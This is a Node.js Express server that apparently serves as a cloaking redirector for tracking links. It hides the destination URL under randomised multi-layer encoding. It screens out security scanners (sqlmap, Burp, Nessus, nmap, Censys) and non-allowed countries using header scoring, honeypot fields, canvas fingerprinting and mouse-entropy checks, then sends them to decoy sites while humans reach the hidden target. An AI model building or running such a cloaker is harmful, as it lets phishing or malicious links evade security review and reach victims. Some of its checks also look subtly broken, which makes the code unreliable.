const express = require('express');
const helmet = require('helmet');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch'); // npm install node-fetch@2
const NodeCache = require('node-cache'); // npm install node-cache

const app = express();

app.set('trust proxy', 1);

// ────────────────────────────────────────────────
// CONFIGURATION
// ────────────────────────────────────────────────
const TARGET_URL = process.env.TARGET_URL || 'https://www.google.com';

const BOT_URLS = [
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://en.wikipedia.org/wiki/Main_Page',
  'https://www.google.com',
  'https://www.bbc.com',
  'https://www.youtube.com'
];

const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);

const LOG_FILE = 'clicks.log';
const PORT = process.env.PORT || 10000;

// Cache country codes for 24h
const geoCache = new NodeCache({ stdTTL: 86400, checkperiod: 600 });

// ────────────────────────────────────────────────
// CSP
// ────────────────────────────────────────────────
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc:   ["'self'", "'unsafe-inline'"],
      imgSrc:     ["'self'", 'data:'],
      connectSrc: ["'self'"],
      frameSrc:   ["'self'"],
    },
  },
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// Health check
app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));

// ────────────────────────────────────────────────
// HELPERS
// ────────────────────────────────────────────────
function isMobile(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  return /android|iphone|ipad|ipod|mobi/i.test(ua);
}

// ────────────────────────────────────────────────
// SERVER-SIDE BOT DETECTION
// ────────────────────────────────────────────────
const strictLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: (req) => isMobile(req) ? 12 : 4,
  standardHeaders: true,
  legacyHeaders: false,
});

const suspiciousUA = [
  /headless/i, /phantom/i, /slurp/i, /zgrab/i, /scanner/i, /bot/i,
  /crawler/i, /spider/i, /burp/i, /sqlmap/i, /nessus/i, /censys/i,
  /zoomeye/i, /nmap/i, /gobuster/i
];

function isLikelyBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const ref = (req.headers['referer'] || '').toLowerCase();
  const accept = req.headers['accept'] || '';

  let score = 0;

  if (suspiciousUA.some(r => r.test(ua))) score += 40;
  if (!ua.includes('mozilla')) score += 25;
  if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 20;
  if (ref && !['google','bing','yahoo','duckduckgo'].some(r => ref.includes(r))) score += 15;
  if (!accept.includes('text/html')) score += 15;

  if (!isMobile(req)) {
    if (!req.headers['sec-ch-ua'] || !req.headers['sec-ch-ua-mobile'] || !req.headers['sec-ch-ua-platform']) score += 30;
    if (!req.headers['sec-fetch-dest'] || !req.headers['sec-fetch-mode'] || !req.headers['sec-fetch-site']) score += 30;
  }

  if (!req.headers['upgrade-insecure-requests']) score += 18;
  if (!req.headers['accept-language'] || req.headers['accept-language'].length < 5) score += 20;
  if (Object.keys(req.headers).length < 12) score += 25;

  const headerKeys = Object.keys(req.headers);
  const sortedKeys = [...headerKeys].sort();
  if (headerKeys.join() === sortedKeys.join()) score += 25;

  console.log(`[BOT-SCORE-SERVER] Mobile=${isMobile(req)} | Score=${score} | UA=${ua.substring(0,100)}...`);

  return score >= 70; // tightened threshold
}

// ────────────────────────────────────────────────
// GEO – CACHED + AUTHENTICATED
// ────────────────────────────────────────────────
async function getCountryCode(req) {
  let ip = (req.headers['x-forwarded-for']?.split(',')[0]?.trim()) ||
           req.headers['x-real-ip'] ||
           req.ip ||
           'unknown';

  if (ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('::1') ||
      ip.startsWith('10.') || (ip.startsWith('172.') && ip.split('.')[1] >= 16 && ip.split('.')[1] <= 31) ||
      ip.startsWith('192.168.')) {
    return 'XX';
  }

  const cached = geoCache.get(ip);
  if (cached) return cached;

  const token = process.env.IPINFO_TOKEN;
  if (!token) return 'XX';

  try {
    const res = await fetch(`https://api.ipinfo.io/${ip}/country_code?token=${token}`, {
      timeout: 4000,
      headers: { 'User-Agent': 'track-godmode/1.0' }
    });

    if (res.ok) {
      const cc = (await res.text()).trim().toUpperCase();
      if (/^[A-Z]{2}$/.test(cc)) {
        geoCache.set(ip, cc);
        return cc;
      }
    }
  } catch (e) {
    console.error(`[GEO-ERR] ${ip} → ${e.message}`);
  }

  return 'XX';
}

// ────────────────────────────────────────────────
// ENCODING LAYERS (unchanged)
// ────────────────────────────────────────────────
const encoders = [
  { name: 'base64', enc: s => Buffer.from(s).toString('base64'), dec: s => Buffer.from(s, 'base64').toString() },
  { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c <= 'Z' ? 13 : -13))), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c <= 'Z' ? -13 : 13))) },
  { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
  { name: 'urlencode', enc: encodeURIComponent, dec: decodeURIComponent },
];

function multiLayerEncode(str) {
  let result = str;
  const noise = crypto.randomBytes(8).toString('hex');
  result = noise + result + noise;

  const shuffled = [...encoders].sort(() => Math.random() - 0.5);
  const selected = shuffled.slice(0, 5);

  for (const layer of selected) {
    result = layer.enc(result);
  }

  result = encodeURIComponent(result);
  result = encodeURIComponent(result);

  return { encoded: result, layers: selected.map(e => e.name).reverse(), noise };
}

function multiLayerDecode(encoded, layers, noise) {
  let result = decodeURIComponent(decodeURIComponent(encoded));

  for (const layerName of layers) {
    const layer = encoders.find(e => e.name === layerName);
    if (layer) result = layer.dec(result);
  }

  if (result.startsWith(noise) && result.endsWith(noise)) {
    result = result.slice(noise.length, -noise.length);
  }

  return result;
}

// ────────────────────────────────────────────────
// /generate (unchanged)
// ────────────────────────────────────────────────
app.get('/generate', (req, res) => {
  const target = req.query.target || TARGET_URL;
  const noisy = target + '#' + crypto.randomBytes(8).toString('hex') + '-' + Date.now();

  const { encoded, layers, noise } = multiLayerEncode(noisy);
  const layersEnc = Buffer.from(JSON.stringify({ layers, noise })).toString('base64url');

  const segments = Array(6).fill().map((_, i) =>
    crypto.randomBytes(8).toString('hex') +
    Math.random().toString(36).substring(2, 12).toUpperCase() +
    (i % 2 ? 'verify' : 'session')
  );

  const path = `/r/${segments.join('/')}/${crypto.randomBytes(12).toString('hex')}`;

  const params = [];
  const keys = ['sid','tok','ref','utm_src','clid','ver','ts','hmac','nonce','_t','cid','fid','l'];
  for (let i = 0; i < 13; i++) {
    const k = keys[i % keys.length] + (i > 6 ? '_' + (i + 1) : '');
    const v = k.startsWith('l') ? layersEnc : encodeURIComponent(crypto.randomBytes(12).toString('base64url'));
    params.push(`${k}=${v}`);
  }

  const url = `https://${req.hostname}${path}?p=${encoded}&${params.join('&')}&v=8.1.${Math.floor(Math.random()*100)}`;

  res.json({ success: true, tracked: url });
});

// ────────────────────────────────────────────────
// MAIN /r/* ROUTE – GOD MODE DETECTION
// ────────────────────────────────────────────────
app.get('/r/*', strictLimiter, async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';

  const country = await getCountryCode(req);

  let geoAllowed = true;
  if (ALLOWED_COUNTRIES.length) geoAllowed = ALLOWED_COUNTRIES.includes(country);
  if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;

  if (!geoAllowed || isLikelyBot(req)) {
    fs.appendFile(LOG_FILE, `${new Date().toISOString()} BLOCK ${ip} ${country} ${ua}\n`, () => {});
    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }

  fs.appendFile(LOG_FILE, `${new Date().toISOString()} PASS ${ip} ${country} ${ua}\n`, () => {});

  // Decode target
  let redirectTarget = TARGET_URL;
  try {
    const params = new URLSearchParams(req.url.split('?')[1] || '');
    const enc = params.get('p') || '';
    const layersB64 = params.get('l') || '';

    if (enc && layersB64) {
      const { layers, noise } = JSON.parse(Buffer.from(layersB64, 'base64url').toString());
      let decoded = multiLayerDecode(enc, layers, noise);
      decoded = decoded.split('#')[0];
      if (!/^https?:\/\//i.test(decoded)) decoded = 'https://' + decoded;
      if (['http:', 'https:'].includes(new URL(decoded).protocol)) {
        redirectTarget = decoded;
      }
    }
  } catch (e) {
    console.error(`[DECODE-ERR] ${ip} → ${e.message}`);
  }

  const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");

  // ─── GOD MODE VERIFICATION PAGE ───
  const hpSuffix = crypto.randomBytes(4).toString('hex'); // randomize field names

  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifying...</title>
  <style>
    body { margin:0; background:#000; color:#fff; font-family:sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; }
    .visually-hidden { position:absolute; width:1px; height:1px; padding:0; margin:-1px; overflow:hidden; clip:rect(0,0,0,0); border:0; }
  </style>
</head>
<body>
  <div>Verifying request •••</div>

  <!-- Advanced honeypots -->
  <div class="visually-hidden">
    <input type="text" name="website_url_${hpSuffix}" id="hpw_${hpSuffix}" autocomplete="off" tabindex="-1">
    <input type="text" name="company_name_${hpSuffix}" id="hpc_${hpSuffix}" autocomplete="off" tabindex="-1">
    <input type="text" name="email_confirm_${hpSuffix}" id="hpe_${hpSuffix}" autocomplete="off" tabindex="-1">
    <input type="checkbox" name="human_check_${hpSuffix}" id="hpx_${hpSuffix}" tabindex="-1">
  </div>

  <script nonce="${res.locals.nonce}">
    const TARGET = '${safeTarget}';
    const BOT    = '${BOT_URLS[0]}';

    let moves = 0, entropy = 0, lastX = 0, lastY = 0, lastTime = Date.now();
    let focusLost = 0;

    function updateEntropy(dx, dy) {
      const dt = (Date.now() - lastTime) / 1000 || 1;
      entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt * 1.6;
      lastTime = Date.now();
      moves++;
    }

    document.addEventListener('mousemove', e => {
      if (lastX && lastY) updateEntropy(Math.abs(e.clientX - lastX), Math.abs(e.clientY - lastY));
      lastX = e.clientX; lastY = e.clientY;
    });

    document.addEventListener('touchmove', e => {
      if (e.touches?.length) {
        const t = e.touches[0];
        if (lastX && lastY) updateEntropy(Math.abs(t.clientX - lastX), Math.abs(t.clientY - lastY));
        lastX = t.clientX; lastY = t.clientY;
      }
    }, {passive: true});

    document.addEventListener('visibilitychange', () => {
      if (document.hidden) focusLost++;
    });

    // Canvas fingerprint
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
    ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
    ctx.fillStyle = '#069'; ctx.fillText('Hello, world!',2,15);
    ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('Hello, world!',4,17);
    const fp = c.toDataURL();

    // Honeypot check
    function isHoneypotFilled() {
      return document.getElementById('hpw_${hpSuffix}')?.value.trim() ||
             document.getElementById('hpc_${hpSuffix}')?.value.trim() ||
             document.getElementById('hpe_${hpSuffix}')?.value.trim() ||
             document.getElementById('hpx_${hpSuffix}')?.checked;
    }

    setTimeout(() => {
      const mobile = /Mobi|Android/i.test(navigator.userAgent);

      const suspicious = 
        isHoneypotFilled() ||
        entropy < (mobile ? 4.5 : 16) ||
        moves < (mobile ? 2 : 5) ||
        fp.includes('iVBORw0KGgo') ||
        navigator.webdriver === true ||
        (window.outerWidth === 0 || window.outerHeight === 0) ||
        navigator.languages?.length < 1 ||
        navigator.maxTouchPoints === undefined ||
        focusLost > (mobile ? 6 : 3);

      console.log(\`[GOD-CHECK] ent:\${entropy.toFixed(1)} mov:\${moves} hp:\${isHoneypotFilled()?'FILLED':'empty'} fpSusp:\${fp.includes('iVBORw0KGgo')?'yes':'no'} → \${suspicious?'BOT':'HUMAN'}\`);

      location.href = suspicious ? BOT : TARGET;
    }, 1200 + Math.random() * 1600); // 1.2–2.8s

    // Fallback if JS blocked/disabled
    setTimeout(() => location.href = BOT, 5000);
  </script>
</body>
</html>
  `);
});

app.use((req, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`God-mode listening on ${PORT}`);
});
